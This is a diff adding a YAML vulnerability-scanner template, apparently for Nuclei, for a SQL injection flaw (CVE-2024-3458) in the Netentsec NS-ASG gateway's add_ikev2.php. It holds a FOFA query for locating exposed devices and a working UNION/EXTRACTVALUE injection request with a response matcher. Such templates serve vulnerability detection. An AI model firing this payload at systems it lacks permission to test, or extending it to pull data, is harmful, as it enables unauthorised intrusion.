@@ -1,0 +1,29 @@
+id: wangkang-NS-ASG-add_ikev2_php-sql-CVE-2024-3458
+
+info:
+  name: "网康科技 NS-ASG 应用安全网关 add_ikev2.php SQL 注入漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: app="网康科技-NS-ASG安全网关"
+      网康科技 NS-ASG 应用安全网关的 add_ikev2.php 接口存在 SQL 注入缺陷。攻击者可通过构造恶意输入在未经身份验证的情况下，利用该漏洞执行任意 SQL 语句，实现数据库敏感信息提取（如管理员凭证、用户隐私数据）及服务器命令注入，最终可能达成对目标系统的完全控制。该漏洞的 CVSS 评分需结合实际环境评估，建议立即应用官方补丁。
+  reference:
+  - https://mp.weixin.qq.com/s/4OUXIdMSfEviZE3VNF9-yQ
+  tags: 网康科技-NS-ASG安全网关
+
+http:
+- raw:
+  - |
+    GET /admin/add_ikev2.php?TunnelId=1+UNION+ALL+SELECT+EXTRACTVALUE(1,concat(0x7e,(select+md5(123123)),0x7e)) HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '~4297f44b13955235245b2497399d7a9'
+  - type: status
+    status:
+    - 200
